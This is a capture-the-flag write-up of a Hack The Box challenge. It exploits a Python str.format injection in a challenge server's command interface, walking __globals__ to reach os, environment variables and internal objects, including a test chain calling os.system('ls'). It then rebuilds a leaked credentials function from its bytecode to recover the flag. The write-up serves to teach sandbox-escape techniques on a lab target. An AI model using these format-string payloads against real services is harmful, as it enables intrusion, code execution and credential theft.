> We successfully hacked into the secret Git server of the HideAndSec,
> and we found the source code of this Python script being used in remote,
> can you help us exploit it, gather their access credentials and arrest these criminals?

> Author: **[mxrch][author-profile]**

## Interacting with the CC

The CC executes the commands listed in a Python format string:

```shell
 nc 157.245.33.77 32222
# Welcome in the HideAndSec secret VPS ! [Location : Paris, France]
# [+] Vipère v1.26 loaded !
# ~ Currently loaded functions : [whoami, get_time, get_version]

# Which function do you want to launch ?
# Example : Bonjour {whoami}, il est actuellement {get_time} !
# => heyhey {whoami}*
# heyhey ctf
```

## The code

The server parses the format string to get the names of the requested functions:

```python
text = interface.get_input()
requested_commands = [fname for _, fname, _, _ in Formatter().parse(text) if fname]
secure_commands = SecureCommands(requested_commands)
```

Then it computes the corresponding functions:

```python
def verify_commands(self):
    for cmd in self.requested_commands:
        if cmd == "debug":
            import pdb; pdb.set_trace()
        if cmd in self.dispatcher and callable(self.dispatcher[cmd]):
            self.dispatcher[cmd] = self.dispatcher[cmd]()
```

And finally returns the results in a dictionary:

```python
interface.print(text.format(**secure_commands.dispatcher))
```

If the command names don't match the dictionary holds:

```python
self.dispatcher = {
    "whoami": self.whoami,
    "get_time": self.get_time,
    "get_version": self.get_version
}
```

So in the `format` call, `{whoami.__globals__}` is replaced with `SecureCommands().whoami.__globals__` which is:

```python
"{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f54d3dc9340>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/main.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'os': <module 'os' from '/usr/local/lib/python3.8/os.py'>, 'subprocess': <module 'subprocess' from '/usr/local/lib/python3.8/subprocess.py'>, 'socketserver': <module 'socketserver' from '/usr/local/lib/python3.8/socketserver.py'>, 'datetime': <class 'datetime.datetime'>, 'Formatter': <class 'string.Formatter'>, 'Station': <class '__main__.Station'>, 'SecureCommands': <class '__main__.SecureCommands'>, 'SecureBridge': <class '__main__.SecureBridge'>, 'ServerContext': <class '__main__.ServerContext'>, 'address': ('0.0.0.0', 1337), 'server': <__main__.ServerContext object at 0x7f54d3c93940>}"
```

They could have evaluated the functions beforehand and stored the results to serve plain strings. But:

```python
# To optimize resources, we only call functions when they are requested
```

## Exploiting the format string

Various tests:

```python
"heyhey {whoami.__init__}"
"heyhey {whoami.__globals__['__builtins__'].__import__('os').getuid}"
"heyhey {whoami.__init__.__class__.__bases__[0].__subclasses__()}"
"heyhey {whoami.__init__.__globals__['__builtins__']}"
"heyhey {whoami.__init__.__globals__['__builtins__']['__import__']('os')}"
"heyhey {whoami.__init__.__globals__['__builtins__']['__import__']('os').system('ls')}"
```

The quotes break the evaluation: contrary to a standard Python expression, keys in format string variables shouldn't be quoted:

```python
# right
"{whoami.__globals__[__builtins__]}"
# wrong
"{whoami.__globals__['__builtins__']}"
```

For the parser, in `{whoami.__globals__}`, the key is `whoami`.

```python
"heyhey {whoami.__globals__}"
# heyhey {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7de7901340>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/main.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'os': <module 'os' from '/usr/local/lib/python3.8/os.py'>, 'subprocess': <module 'subprocess' from '/usr/local/lib/python3.8/subprocess.py'>, 'socketserver': <module 'socketserver' from '/usr/local/lib/python3.8/socketserver.py'>, 'datetime': <class 'datetime.datetime'>, 'Formatter': <class 'string.Formatter'>, 'Station': <class '__main__.Station'>, 'SecureCommands': <class '__main__.SecureCommands'>, 'SecureBridge': <class '__main__.SecureBridge'>, 'ServerContext': <class '__main__.ServerContext'>, 'address': ('0.0.0.0', 1337), 'server': <__main__.ServerContext object at 0x7f7de77cb940>}
```
The chain has to be structured so that the parser identifies the key as "whoami", to maintain the match `"whoami" => SecureCommands.whoami`.

[Hacktricks][hacktricks-format-string] shows a few tricks to explore the code:

```python
"{whoami.__globals__[os].environ}"
# environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': 'miscvipere-413156-6f7c57c9cf-pjjgh', 'LANG': 'C.UTF-8', 'GPG_KEY': 'E3FF2839C048B25C084DEBE9B26995E310250568', 'PYTHON_VERSION': '3.8.11', 'PYTHON_PIP_VERSION': '21.1.3', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/a1675ab6c2bd898ed82b1f58c486097f763c74a9/public/get-pip.py', 'PYTHON_GET_PIP_SHA256': '6665659241292b2147b58922b9ffe11dda66b39d52d8a6f3aa310bc1d60ea6f7', 'KUBERNETES_SERVICE_PORT': '443', 'KUBERNETES_SERVICE_PORT_HTTPS': '443', 'KUBERNETES_PORT': 'tcp://10.245.0.1:443', 'KUBERNETES_PORT_443_TCP': 'tcp://10.245.0.1:443', 'KUBERNETES_PORT_443_TCP_PROTO': 'tcp', 'KUBERNETES_PORT_443_TCP_PORT': '443', 'KUBERNETES_PORT_443_TCP_ADDR': '10.245.0.1', 'KUBERNETES_SERVICE_HOST': '10.245.0.1', 'HOME': '/home/ctf'})
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}"
# {'bank_accounts': {'official': 10000, 'offshore': 1983388028}, 'total_infected': 275470559, 'viperebot_new_victims_pairs_ids': ['4e1a50c6-9eab-47d0-b268-89c4b70402ce', '825bd6da-eacc-4090-b537-02598e022694', 'fb63b301-58a1-456a-a47b-f43e253b7ada', '7b1d2d11-1394-48e5-8f37-93f0df979736', '226bca53-e670-4cc7-bfe5-8fa64f9a0d67']}}
"{whoami.__globals__[server].__dict__[RequestHandlerClass].__dict__}"
# {'__module__': '__main__', 'get_loaded_commands': <function Station.get_loaded_commands at 0x7f9177cf65e0>, 'get_input': <function Station.get_input at 0x7f9177cfb820>, 'print': <function Station.print at 0x7f9177cfb8b0>, 'handle': <function Station.handle at 0x7f9177cfb940>, '__doc__': None}
"{whoami.__globals__[SecureCommands].__dict__}"
"{whoami.__globals__[SecureCommands].__dict__[verify_commands].__code__}"
```

```python
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__class__.__dict__}"
# {'__module__': 'database', '__init__': <function SecureDatabase.__init__ at 0x7f54d3c35af0>, 'update': <function SecureDatabase.update at 0x7f54d3c35b80>, 'connect': <function SecureDatabase.connect at 0x7f54d3c35c10>, 'get_credentials': <function SecureDatabase.get_credentials at 0x7f54d3c35ca0>, '__dict__': <attribute '__dict__' of 'SecureDatabase' objects>, '__weakref__': <attribute '__weakref__' of 'SecureDatabase' objects>, '__doc__': None}
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__class__.__dict__[get_credentials]}"
# <function SecureDatabase.get_credentials at 0x7f54d3c35ca0>
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__class__.__dict__[get_credentials].__code__}"
# <code object get_credentials at 0x7f54d3bf2b30, file "/home/ctf/database.py", line 22>
```

## Reproducing the funtion "get_credentials"

The last chain can be used to extract the assembly of the function `get_credentials`:

```python
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__class__.__dict__[get_credentials].__code__.co_argcount}"
# 1
"{whoami.__globals__[server].__dict__[bridge].__dict__[db].__class__.__dict__[get_credentials].__code__.co_code}"
# b'd\x01}\x01d\x02}\x02d\x03d\x00d\x00d\x04\x85\x03\x19\x00}\x03d\x05d\x00d\x00d\x04\x85\x03\x19\x00}\x04d\x06}\x05d\x07}\x06d\x08}\x07t\x00|\x01\x83\x01|\x03\x17\x00t\x00d\t\x83\x01\x17\x00|\x04\x17\x00|\x07\x17\x00|\x02\xa0\x01d\nd\x0b\xa1\x02\x17\x00|\x06d\x00d\x00d\x04\x85\x03\x19\x00\x17\x00d\x0c\x17\x00t\x00|\x05\x83\x01d\r\x14\x00\x17\x00t\x00d\x0e\x83\x01\x17\x00}\x01d\x0fd\x10d\x11d\x12\x9c\x03}\x08|\x08D\x00]\x14}\t|\x01\xa0\x01|\t|\x08|\t\x19\x00\xa1\x02}\x01q\x8e|\x01S\x00'
```

According to [Hacktricks <3][hacktricks-leak-function] this informations can be decompiled to recreate the original function.

After having extracted all the properties of the function, we get:

```python
# leaked properties of "get_credentials"
ARGCOUNT = 1
POSONLYARGCOUNT = 0
KWONLYARGCOUNT = 0
NLOCALS = 10
STACKSIZE = 6
FLAGS = 67
BYTECODE = b'd\x01}\x01d\x02}\x02d\x03d\x00d\x00d\x04\x85\x03\x19\x00}\x03d\x05d\x00d\x00d\x04\x85\x03\x19\x00}\x04d\x06}\x05d\x07}\x06d\x08}\x07t\x00|\x01\x83\x01|\x03\x17\x00t\x00d\t\x83\x01\x17\x00|\x04\x17\x00|\x07\x17\x00|\x02\xa0\x01d\nd\x0b\xa1\x02\x17\x00|\x06d\x00d\x00d\x04\x85\x03\x19\x00\x17\x00d\x0c\x17\x00t\x00|\x05\x83\x01d\r\x14\x00\x17\x00t\x00d\x0e\x83\x01\x17\x00}\x01d\x0fd\x10d\x11d\x12\x9c\x03}\x08|\x08D\x00]\x14}\t|\x01\xa0\x01|\t|\x08|\t\x19\x00\xa1\x02}\x01q\x8e|\x01S\x00'
CONSTS = (None, 72, 'apts_c', 'BT', -1, 'orc', 109, 'ocoh', 'iss', 123, 'p', 'n', '_h', 4, 125, '0', '1', '4', ('o', 'l', 'a'))
NAMES = ('chr', 'replace')
VARNAMES = ('self', 'f', 'a', 'blue', 'c', 'm', 'h', 'i', 'd', 'x')
FILENAME = '/home/ctf/database.py'
NAME = 'get_credentials'
FIRSTLINENO = 22
LNOTAB = b'\x00\x01\x04\x01\x04\x01\x0e\x01\x0e\x01\x04\x01\x04\x01\x04\x01N\x01\x0c\x01\x08\x01\x12\x01'
CELLVARS = ()
FREEVARS = ()

# builder
function_type = type(lambda: None)
code_type = type((lambda: None).__code__)
code_obj = code_type(ARGCOUNT, POSONLYARGCOUNT, KWONLYARGCOUNT, NLOCALS, STACKSIZE, FLAGS, BYTECODE, CONSTS, NAMES, VARNAMES, FILENAME, NAME, FIRSTLINENO, LNOTAB, cellvars=CELLVARS, freevars=FREEVARS)
function_obj = function_type(code_obj, {'__builtins__': __builtins__}, None, None, None)
```

Still, it can't be called as is:

```shell
python get_credentials.py
# TypeError: get_credentials() missing 1 required positional argument: 'self'
```

So we encapsulate it in a class:

```python
class SecureDatabase():

    def __init__(self):
        pass

SecureDatabase.get_credentials = function_type(code_obj, {'__builtins__': __builtins__}, None, None, None)

print(SecureDatabase().get_credentials())
```

> `HTB{cr0iss4nts_ch0c0_hmmmm}`

[author-profile]: https://app.hackthebox.com/users/181024
[hacktricks-format-string]: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#globals-and-locals
[hacktricks-leak-function]: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#recreating-a-leaked-function
[stackoverflow]: https://softwareengineering.stackexchange.com/a/182095
